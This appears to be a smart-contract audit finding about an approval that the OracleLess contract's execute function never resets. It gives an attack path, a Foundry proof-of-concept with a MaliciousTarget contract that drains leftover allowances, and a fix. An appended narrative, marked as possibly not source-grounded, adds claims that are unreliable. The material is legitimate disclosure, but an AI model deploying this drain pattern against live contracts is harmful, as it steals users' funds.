---
id: 1923
severity: "High"
---

# Failure to reset unspent approval

## Description

The contract gives arbitrary approval to untrusted contracts when filling orders. These approvals don't need to be fully utilized, and in situations where the approvals are not fully used they are not revoked. Worse, the order creator gets refunded for all unspent tokens. This leaves a malicious contract with unused approvals that they can use to steal funds. This attack is very easy to perform and can be done multiple times.
The root cause is the failure to set approval to zero after the call to the target contract.
https://github.com/oku/oku-custom-order-types/contracts/automatedTrigger/OracleLess.sol#L240
```solidity
function execute(
    address target,
    bytes calldata txData,
    Order memory order
) internal returns (uint256 amountOut, uint256 tokenInRefund) {
    // update accounting
    uint256 initialTokenIn = order.tokenIn.balanceOf(address(this));
    uint256 initialTokenOut = order.tokenOut.balanceOf(address(this));
    // approve
    order.tokenIn.safeApprove(target, order.amountIn);
    // perform the call
    (bool success, bytes memory reason) = target.call(txData);
    if (!success) {
        revert TransactionFailed(reason);
    }
    uint256 finalTokenIn = order.tokenIn.balanceOf(address(this));
    require(finalTokenIn >= initialTokenIn - order.amountIn, "over spend");
    uint256 finalTokenOut = order.tokenOut.balanceOf(address(this));
    require(
        finalTokenOut - initialTokenOut > order.minAmountOut,
        "Too Little Received"
    );
    amountOut = finalTokenOut - initialTokenOut;
    tokenInRefund = order.amountIn - (initialTokenIn - finalTokenIn);
}
```
Internal pre-conditions
There are pending orders in the contract, for example worth 100 ETH;
External pre-conditions
Attack Path
1. Attacker creates a malicious contract like the one in my POC
2. Attacker creates an order with 1 ETH, but the min amount out will be 1 wei
3. Attacker fills their order immediately with the malicious contract.
4. By doing this the attacker earns approximately 1 ETH; they can do this multiple times to steal everything.
1. The whole contract balance will be lost to the attacker.
2. Similar issue is on the Bracket Contract

## Proof of Concept

The output of the POC below shows that the attacker almost doubled their initial balance by performing this action.
[PASS] testAttack() (gas: 435837)
Logs:
ATTACKER BALANCE BEFORE ATTACK :
MALICIOUS CONTRACT ALLOWANCE :
ATTACK BALANCE AFTER ATTACK :
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import { ERC20Mock } from "openzeppelin-contracts/contracts/mocks/token/ERC20Mock.sol";
import { AutomationMaster } from "../contracts/automatedTrigger/AutomationMaster.sol";
import { OracleLess } from "../contracts/automatedTrigger/OracleLess.sol";
import "../contracts/interfaces/uniswapV3/IPermit2.sol";
import "../contracts/interfaces/openzeppelin/ERC20.sol";
import "../contracts/interfaces/openzeppelin/IERC20.sol";

contract MaliciousTarget {
    IERC20 tokenIn;
    IERC20 tokenOut;

    constructor (IERC20 _tokenIn, IERC20 _tokenOut) {
        tokenIn = _tokenIn;
        tokenOut = _tokenOut;
    }

    fallback () external payable {
        tokenIn.transferFrom(msg.sender, address(this), 1);
        tokenOut.transfer(msg.sender, 1);
    }

    function spendAllowance(address victim) external {
        tokenIn.transferFrom(victim, msg.sender, 100 ether - 1);
    }
}

contract PocTest2 is Test {
    AutomationMaster automationMaster;
    OracleLess oracleLess;
    IPermit2 permit2;
    IERC20 tokenIn;
    IERC20 tokenOut;
    MaliciousTarget target;

    address attacker = makeAddr("attacker");
    address alice = makeAddr("alice");

    function setUp() public {
        automationMaster = new AutomationMaster();
        oracleLess = new OracleLess(automationMaster, permit2);
        tokenIn = IERC20(address(new ERC20Mock()));
        tokenOut = IERC20(address(new ERC20Mock()));
        target = new MaliciousTarget(tokenIn, tokenOut);

        // MINT
        ERC20Mock(address(tokenIn)).mint(alice, 100 ether);
        ERC20Mock(address(tokenIn)).mint(attacker, 100 ether);
        ERC20Mock(address(tokenOut)).mint(address(target), 1);
    }

    function testAttack() public {
        uint96 orderId;

        // Innocent User
        vm.startPrank(alice);
        tokenIn.approve(address(oracleLess), 100 ether);
        orderId = oracleLess.createOrder(tokenIn, tokenIn, 100 ether, 9 ether, alice, 1, false, '0x0');
        vm.stopPrank();

        // Attacker
        console.log("ATTACKER BALANCE BEFORE ATTACK : ", tokenIn.balanceOf(attacker));
        vm.startPrank(attacker);
        tokenIn.approve(address(oracleLess), 100 ether);
        orderId = oracleLess.createOrder(tokenIn, tokenOut, 100 ether, 0, attacker, 1, false, '0x0');
        oracleLess.fillOrder(1, orderId, address(target), "0x");
        console.log("MALICIOUS CONTRACT ALLOWANCE : ", tokenIn.allowance(address(oracleLess), address(target)));
        // Spend allowance
        target.spendAllowance(address(oracleLess));
        console.log("ATTACK BALANCE AFTER ATTACK : ", tokenIn.balanceOf(attacker));
        vm.stopPrank();
    }
}
```

## Recommendation

```solidity
function execute(
    address target,
    bytes calldata txData,
    Order memory order
) internal returns (uint256 amountOut, uint256 tokenInRefund) {
    // update accounting
    uint256 initialTokenIn = order.tokenIn.balanceOf(address(this));
    uint256 initialTokenOut = order.tokenOut.balanceOf(address(this));
    // approve
    order.tokenIn.safeApprove(target, order.amountIn);
    // perform the call
    (bool success, bytes memory reason) = target.call(txData);
    if (!success) {
        revert TransactionFailed(reason);
    }
    order.tokenIn.safeApprove(target, 0);
    uint256 finalTokenIn = order.tokenIn.balanceOf(address(this));
    require(finalTokenIn >= initialTokenIn - order.amountIn, "over spend");
    uint256 finalTokenOut = order.tokenOut.balanceOf(address(this));
    require(
        finalTokenOut - initialTokenOut > order.minAmountOut,
        "Too Little Received"
    );
    amountOut = finalTokenOut - initialTokenOut;
    tokenInRefund = order.amountIn - (initialTokenIn - finalTokenIn);
}
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is an approval‑reset omission in the order execution routine. When the contract prepares to call an external target it grants the target an allowance equal to the full input token amount, but after the external call returns it never clears that allowance. Because the allowance remains non‑zero, a malicious target contract can later invoke transferFrom on the token and move any remaining approved tokens out of the order contract. The root cause is the missing safeApprove(target,0) statement after the external call, which violates the principle of least privilege and leaves a dangling permission. An attacker can exploit this by creating a contract that accepts the order, receives the approved tokens, and then calls transferFrom on the token to drain the leftover balance. The attack flow is: (1) attacker creates a malicious contract; (2) attacker creates an order with a small amount of input token and a minimal output requirement; (3) the order is filled using the malicious contract as the target; (4) the contract approves the target for the full input amount, the call succeeds, and the order logic refunds any unspent input; (5) because the approval is never revoked, the malicious contract calls transferFrom to pull the unspent tokens; (6) the attacker repeats the process, eventually emptying the contract’s token holdings. The impact is a complete loss of funds for the protocol and any users who placed orders, as the contract balance can be drained repeatedly. This occurs whenever an order is filled with a target that does not consume the full approved amount, which is common when the target contract’s logic is simple or when the order’s minAmountOut is set to a negligible value. All participants—order creators, the protocol’s treasury, and downstream users—are affected because their tokens can be stolen without any on‑chain indication other than a reduction in balance. The issue was discovered during a manual audit that examined the execute function and noticed that the allowance was never reset after the external call. It is easy to miss because the contract’s accounting appears correct: the refund calculation uses balance differences, and the transaction does not revert, so the leftover allowance is invisible to standard tests that only check balances. The bug belongs to the class of “unrevoked token allowance” or “approval race” vulnerabilities, where a contract grants a spender more rights than necessary and fails to clean up, breaking the expected accounting invariants. From a user’s perspective the symptom is that after filling an order they may see their token balance reduced dramatically or even to zero, while the transaction receipt shows a successful order and a refund amount that seems correct. The expectation that the contract will only spend the exact amount specified is violated, leading to funds disappearing. The proper fix is to reset the token allowance to zero immediately after the external call, or to use the ERC20 permit pattern or safeIncreaseAllowance/ safeDecreaseAllowance to limit the granted amount to the exact amount needed for the call, thereby restoring the principle of least privilege and preventing leftover approvals from being abused.
